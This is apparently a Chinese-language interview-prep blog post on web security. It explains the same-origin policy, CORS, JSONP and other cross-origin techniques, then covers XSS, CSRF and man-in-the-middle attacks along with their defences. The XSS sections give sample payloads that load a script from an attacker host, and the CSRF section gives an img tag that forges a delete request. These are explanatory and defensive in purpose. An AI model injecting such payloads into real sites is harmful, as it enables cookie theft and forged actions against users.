---
pubDatetime: 2024-02-24T14:41:46.748Z
title: Web 安全
featured: true
draft: false
tags:
  - web 安全
  - JavaScript
  - 面试
description: 本篇将通过两个部分来展开 Web 的安全，其中第一部分【同源策略】就是浏览器的第一道安全防线。在有些业务场景里确实会需要进行跨域访问通信，那么就有一些对应的解决方案。第二部分是【安全防范】是我们的网站可能会面临的一些被动攻击，已经对应的防范策略。
---

因为网页可以在设备上执行任意的 JavaScript 代码，存在很大的安全隐患。浏览器厂商一直在努力平衡两个相互制约的目标：

- 定义强大的客户端 API，让 Web 应用用途更广；
- 防止恶意代码读取或修改用户数据、侵犯用户隐私、欺诈用户等。

浏览器对恶意 JavaScript 代码的第一道防线，就是让其不支持某些能力：

- 不能读写客户端计算机中的文件，也不能展示任意文件目录；
- 客户端 JavaScript 没有通用的网络能力。虽然可以发送 HTTP 请求，或是通过 WebSocket 跟服务器通信，但是这些 API 都是由浏览器提供的，无法随意访问服务器。

本篇将通过两个部分来展开 Web 的安全，其中第一部分【同源策略】就是浏览器的第一道安全防线。在有些业务场景里确实会需要进行跨域访问通信，那么就有一些对应的解决方案。第二部分是【安全防范】是我们的网站可能会面临的一些被动攻击，已经对应的防范策略。

## Table of contents

## 同源策略

![image.png](@assets/images/web-security/same-origin.png)
文档的源，就是文档URL 的 **协议 & 主机 & 端口**，三者均一致认为同源。
因为 file:xxx 或者 http://localhost:xxx 都会认为是独立的源，所以在本地开发期间我们需要通过静态 web 服务器或者代理服务器来发送请求。
需要注意的是，script 自身的源（src:url）与同源策略是不相关的【其实这里除了 script 的 src，还包括 img 的 src，link 的 href】， 相关的是包含这个 script 脚本的 html 文档的源。比如：主机 A 有一个 script 文件，主机 B 上的一个网页，通过 `<script src='A'>` 包含了这个脚本，那么该 script 脚本的源是主机 B，且这个脚本对当前包含它的 html 文档是具有完全访问权的。
同源策略也会应用到脚本里的 HTTP 请求，这个是最常见的。JavaScript 代码可以向托管其包含 HTML 文档的服务器发送 HTTP 请求，不能与其它服务器通信（除非服务器开启了 CORS 跨域资源共享）。

### CORS 跨域资源共享

浏览器同源策略限制了跨域的请求，有个容易误解的地方，并不是浏览器前置的阻止了这个请求。
这里分两种情况，简单请求和非简单请求。当请求满足以下条件时就是一个简单请求：

- 请求方法：GET、HEAD、POST。
- 请求头：Accept、Accept-Language、Content-Language、Content-Type。Content-Type 仅支持：application/x-www-form-urlencoded、multipart/form-data、text/plain。

#### 简单请求

1. 浏览器会直接发送请求，请求头会自动添加 Origin，如 `Origin: http://abc.com`，以此告诉服务器，是哪个源地址在跨域请求；
2. 服务端收到请求，如果允许该请求，在响应头中新增 `Access-Control-Allow-Origin` 来明确列出对哪些源提供服务，或者使用 \* 通配符表示可以接收任意源来的请求，如 `Access-Control-Allow-Origin: http://my.com`
3. 浏览器根据这些 CORS 头部确定是否通过同源策略，处理返回结果。

#### 需预检请求

非简单请求跨域的话，浏览器会自动向服务端发送一个 OPTIONS 请求，通过服务端返回的 `Access-Control-Allow-\*` 判定请求是否被允许。
预检请求流程预检请求包含以下信息：

1. **Origin** 头部：标识请求的来源。
2. **Access-Control-Request-Method** 头部：标识实际请求使用的 HTTP 方法。
3. **Access-Control-Request-Headers** 头部：标识实际请求中会包含的额外头部信息。

服务器在收到预检请求后，需要进行以下处理：

1. 如果请求方法不在允许的方法列表中，返回一个适当的 HTTP 状态码，如 405 Method Not Allowed。
2. 如果请求头部不在允许的头部列表中，返回一个适当的 HTTP 状态码，如 400 Bad Request。
3. 如果一切都符合要求，返回一个包含以下头部的响应：
   - **Access-Control-Allow-Origin**：允许的域或者 **\***（表示允许所有域）。
   - **Access-Control-Allow-Methods**：允许的方法列表。
   - **Access-Control-Allow-Headers**：允许的头部列表。
   - **Access-Control-Max-Age**：预检请求的有效期。

这样浏览器就会知道是否允许实际请求，并根据响应头部进行相应的处理。

### 反向代理

先解释一下反向代理，这也是个容易歧义的概念。
正向代理Forward Proxy）是代理客户端向目标服务器发起请求，反向代理（Reverse Proxy）是代理服务器代表客户端向目标服务器发起请求，并将从目标服务器返回的响应传递给客户端。简单说，就是中间多了一个代理服务器，客户端->代理服务器->目标服务器。并不是直观的方向上的正反。
反向代理解决跨域问题的方案，依赖同源的服务端对请求做一个转发处理，将请求从跨域请求转换成同源请求。
实现方式为在页面同域下配置一套反向代理服务，页面请求同域的服务端，服务端请求上游的实际的服务端，之后将结果返回给前端。

### JSONP

如上文所述，`<script>` 的 src 并不受同源策略的限制，JSONP 的原理是利用了浏览器加载 JavaScript 资源文件时不受同源策略的限制而实现的。这种方式需要前后端的协同配合：
前端动态构造一个 script 标签插入到文档中，其 src 指向后端接口地址，url 参数传入一个回调函数名，代码：

```javascript
//创建一个 script 标签
var script = document.createElement("script");

//script 的 src 属性设置接口地址，并带一个callback回调函数名称
script.src = "http://127.0.0.1:8888/index.php?callback=jsonpCallback";

//插入到⻚面
document.head.appendChild(script);

//通过定义函数名去接收后台返回数据
function jsonpCallback(data) {
  //注意 jsonp返回的数据是json对象可以直接使用
  //ajax 取得数据是json字符串需要转换成json对象才可以使用。
}
```

后端对应服务接收到请求，处理数据之后，构造一个函数调用表达式返回，如 `jsonpCallback(data)`，这样 JS 会直接执行这个函数调用，前端获取到 data。
不过这种方式有点古老，而且受限于这个骚操作的原理是通过资源请求发起的，它也只能支持到 GET 请求。

### 修改 document.domain

该方法仅适用于多子域名的大网站，比如服务器地址 xxx.com，请求可能来自 a.xxx.com 或者 b.xxx.com，这时可以通过在 script 脚本中把 document.domain 设置为 xxx.com 来修改自己的源，来通过同源策略。

- 可将相同一级域名下的子域名页面的 document.domain 设置为一级域名实现跨域。
- 可将同域不同端口的 document.domain 设置为同域名实现跨域（端口被置为 null）。

注意这种方式必须是同一个一级域名。

### postMessage 方式

这不是一种通用的跨域方式，用于页面内嵌`<iframe>`的时候，在两个不同源的页面之间进行通信。

## 安全防范

### 2.1 XSS 跨站脚本攻击

Cross Site Scripting 为了和 CSS 区别，CSS 指的是层叠样式表 (Cascading Style Sheets) 用户输入或使用其他方式向代码中注入其他JS，然后JS代码被执行。

1. 可能是写一个死循环、获取cookie登录
2. 监听用户行为
3. 修改DOM伪造登录表单
4. ⻚面生成浮窗广告

#### 反射型（非持久）

攻击者通过在 URL 插入恶意代码，其他用户访问该恶意链接时，服务端在 URL 取出恶意代码后拼接至 HTML 中返回给用户浏览器。

1. 攻击者诱导被害者打开链接 `http://xxx.com?name=<script src="http://a.com/attack.js"/>`。
2. 被攻击网站服务器收到请求后，**未经处理**直接将 URL 的 name 字段直接拼接至前端模板中，并返回数据。
3. 被害者在不知情的情况下，执行了攻击者注入的脚本（可以通过这个获取对方的 Cookie 等）。

#### 存储型（持久）

攻击者将注入型脚本提交至被攻击网站数据库中，当其他用户浏览器请求数据时，注入脚本从服务器返回并执行。

1. 攻击者在目标网站留言板中提交了`<script src="http://a.com/attack.js"/>`。
2. 目标网站服务端**未经转义**存储了恶意代码，前端请求到数据后直接通过 innerHTML 渲染到页面中。
3. 其他用户在访问该留言板时，会自动执行攻击者注入脚本。

#### DOM型

攻击者通过在 URL 插入恶意代码，客户端脚本取出 URL 中的恶意代码并执行。

1. 攻击者诱导被害者打开链接 `http://xxx.com?name=<script src="http://a.com/attack.js"/>`。
2. 被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。
3. 被害者在不知情的情况下，执行了攻击者注入的脚本。

#### _防范方式_

**一个信念，两个利用**

- 对于外部传入的内容要进行充分转义。
- 开启 CSP（Content Security Policy，**内容**安全策略），规定客户端哪些**外部资源**可以加载和执行，补充浏览器同源策略对资源文件的限制，降低 XSS 风险。

```http
// script-src： 指定允许加载脚本的资源
Content-Security-Policy: script-src 'self' https://trusted-scripts.com;
```

- 设置 Cookie **httpOnly** 属性，禁止 JavaScript 读取 Cookie 防止被窃取。

### 2.2 CSRF 跨站请求伪造

攻击者诱导受害者进入第三方网站，在第三方网站中向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的身份凭证 (比如 cookie)，达到冒充用户对被攻击的网站执行某项操作的目的。

1. 攻击者在第三方网站上放置一个 img：`<img src="http://aaa.com/article/delete" />`；
2. 受害者访问该页面后（前提：受害者在 aaa.com 登录过且产生了 Cookie 信息），浏览器会自动发起这个请求，aaa.com 就会收到包含受害者身份凭证的一次跨域请求；
3. 若目标网站没有任何防范措施，那攻击者就能冒充受害者完成这一次请求操作。

注意 CSRF 攻击一般发生在第三方网站上，攻击者利用的是 http 请求自动携带 cookie 的本质，伪装了一次正常的请求，并没有直接获取到用户信息。

#### _防范方法_

- 设置 Cookie 的 SameSite 属性可以用来限制第三方 Cookie 的使用
  - 在 Strict 模式下，浏览器完全禁止第三方请求携带Cookie。比如请求sanyuan.com网站只能在sanyuan.com域名 当中请求才能携带 Cookie，在其他网站请求都不能。
  - 在Lax模式，宽松一点，但是只能在 get 方法提交表单况或者a 标签发送 get 请求的情况下可以携带 Cookie，其 他情况均不能。
  - 在None模式下，也就是默认模式，请求会自动携带上 Cookie。
- 使用 CSRF Token 验证用户身份
  - 原理：服务端生成 CSRF Token （通常存储在 Session 中），用户提交请求时携带上 Token，服务端验证 Token 是否有效。
  - 优点：能比较有效的防御 CSRF （前提是没有 XSS 漏洞泄露 Token）。
  - 缺点：大型网站中 Session 存储会增加服务器压力，且若使用分布式集群还需要一个公共存储空间存储 Token，否则可能用户请求到不同服务器上导致用户凭证失效；有一定的工作量。

### 2.3 中间人攻击

是指攻击者与通讯的两端分别创建独立的联系，在通讯中充当一个中间人角色对数据进行监听、拦截甚至篡改。

#### _防范方式_

对于开发者来说：

- 支持 HTTPS：
  - 因为攻击者拦截到用户到服务器的请求后，攻击者继续和服务器保持 HTTPS 连接，并与用户降级为不安全的 HTTP 连接。
- 开启 HSTS 策略：
  - 服务器可以通过开启 HSTS（HTTP Strict Transport Security）策略，告知浏览器必须使用 HTTPS 连接。但是有个缺点是用户首次访问时因还未收到 HSTS 响应头而不受保护。

对于用户来说：

- 尽可能使用 HTTPS 链接。
- 避免连接不知名的 WiFi 热点。
- 不忽略不安全的浏览器通知。
- 公共网络不进行涉及敏感信息的交互。
- 用可信的第三方 CA 厂商，不下载来源不明的证书。
